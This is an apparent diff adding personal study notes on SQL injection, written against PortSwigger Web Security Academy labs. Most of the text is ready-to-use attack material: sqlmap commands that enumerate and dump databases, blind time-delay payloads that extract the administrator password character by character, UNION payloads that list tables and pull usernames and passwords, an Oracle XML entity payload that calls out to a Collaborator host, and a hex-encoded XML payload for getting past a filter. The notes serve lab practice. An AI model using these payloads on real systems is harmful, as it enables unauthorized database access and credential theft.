@@ -1,0 +1,67 @@
+SQLMAP methodology:
+
+1st run, generate the command line using the burp extension, copy it into kali, the command should look something like this:
+sqlmap --cookie 'cookie' -u 'https://burplab.web-security-academy.net/the-rest-of-the-query' -p vuln_parameter --random-agent (or a specified UA) --level=5 --risk=1 --proxy=http://127.0.0.1:8080 --batch --dbs --tables, opt. columns with --columns
+
+this will identify the database and its tables after finding the injection 
+
+once it finds the injection it gets cached, so next attack will go through way faster
+next step is to run the same query as before, but instead of --dbs and --tables, we enum the database of interest with the -D switch and the table of interest with the -T switch, and then dump with --dump 
+
+so the commands looks like so:
+sqlmap --cookie 'cookie' -u 'https://burplab.web-security-academy.net/the-rest-of-the-query' -p vuln_parameter --random-agent (or a specified UA) --level=5 --risk=1 --proxy=http://127.0.0.1:8080 --batch -D db_name -T table_name --dump 
+
+this will make sqlmap dump the usernames and passwords
+
+
+
+
+category select or tracking ID 
+test for blind, time delays or collaborator payloads if theres no errors and no other func
+
+blind sqli with passwd extraction:
+Cookie: TrackingId=rTdUSMHDtlACWIZo'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§0§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ;
+
+TrackingId='+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--
+
+this returns the 1st value in password from users, which happens to be the admin passwd 
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+ORACLE DNS lookup payload 
+
+
+clusterbomb intruder
+
+for when theres category parameter:
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_jmtaqo,+password_klumsw+FROM+users_ynfuja--
+
+If theres the category filter but all it does is 500 Internal Server Error 
+try payloads for different database types
+
+solution for a oracle database:
+/filter?category='+Union+Select+USERNAME_DKTEVL,PASSWORD_VPMLUR+from+USERS_SYLBSH--
+
+
+BASIC METHODOLOGY for UNION attacks
+confirm that sqli is possible
+find out how many columns there is and which one is reflected by trying 
+UNION SELECT 1,2,3,4,5, etc. 
+find out the table name 
+find out columns name 
+SELECT columnname1, columnname2, from tablename 
+
+
+WTIH XML
+when none of the XML payloads work and you suspect SQLI
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>
+<@hex_entities>
+1 UNION SELECT username || '~' || password FROM users
+<@/hex_entities>
+</storeId></stockCheck>
+
+this returned 'Attack detected' but after watching some tiktokts and waiting, it just went through
